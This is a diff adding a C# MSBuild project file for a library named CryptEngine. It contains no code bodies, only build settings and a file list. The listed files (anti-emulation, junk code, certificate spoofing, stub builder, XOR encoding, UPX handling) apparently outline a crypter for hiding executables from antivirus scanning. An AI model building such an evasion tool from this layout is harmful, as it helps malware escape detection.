@@ -1,0 +1,145 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{1E3C5A45-F1B7-4864-9690-A9E536292146}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>CryptEngine</RootNamespace>
+    <AssemblyName>CryptEngine</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <PlatformTarget>x86</PlatformTarget>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <PlatformTarget>x86</PlatformTarget>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x86\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
+    <OutputPath>bin\x86\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>..\..\resourcelib-master\resourcelib-master\Source\ResourceLib\bin\Release\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Constructors\AntiEmulationConstructor.cs" />
+    <Compile Include="Constructors\HeurImportConstructor.cs" />
+    <Compile Include="Constructors\ImportConstructor.cs" />
+    <Compile Include="Constructors\TimeDateStampConstructor.cs" />
+    <Compile Include="Constructors\WinAPIConstructor.cs" />
+    <Compile Include="NewPE\Demo.cs" />
+    <Compile Include="NewPE\NewPE.cs" />
+    <Compile Include="NewPE\PEDirectory.cs" />
+    <Compile Include="NewPE\PEFactory.cs" />
+    <Compile Include="NewPE\Structs\PE_DATA_DIRECTORY.cs" />
+    <Compile Include="NewPE\Structs\PE_DOS_HEADER.cs" />
+    <Compile Include="NewPE\Structs\PE_FILE_HEADER.cs" />
+    <Compile Include="NewPE\Structs\PE_NT_HEADER.cs" />
+    <Compile Include="NewPE\Structs\PE_OPTIONAL_HEADER.cs" />
+    <Compile Include="NewPE\Structs\PE_SECTION_HEADER.cs" />
+    <Compile Include="OverlayDetector.cs" />
+    <Compile Include="UPXUtility.cs" />
+    <Compile Include="Extensions\ArrayExtensions.cs" />
+    <Compile Include="Misc\CertSpoofer.cs" />
+    <Compile Include="Cryptography\Keys.cs" />
+    <Compile Include="Cryptography\LEncode.cs" />
+    <Compile Include="Cryptography\Xor.cs" />
+    <Compile Include="Constructors\DataConstructor.cs" />
+    <Compile Include="Constructors\ImportTableConstructor.cs" />
+    <Compile Include="Structures\InnerStub.cs" />
+    <Compile Include="Constructors\JunkCodeConstructor.cs" />
+    <Compile Include="Structures\OutterStub.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Resources.cs" />
+    <Compile Include="Misc\RichSignature.cs" />
+    <Compile Include="SectionAddresses.cs" />
+    <Compile Include="Extensions\StringExtensions.cs" />
+    <Compile Include="StubBuilder.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\IMPORT_INFO_TEMPLATE.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\IMPORT_MODULE_TEMPLATE.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Template.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\version_info.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tmp.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\VPatcher.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\01.txt" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
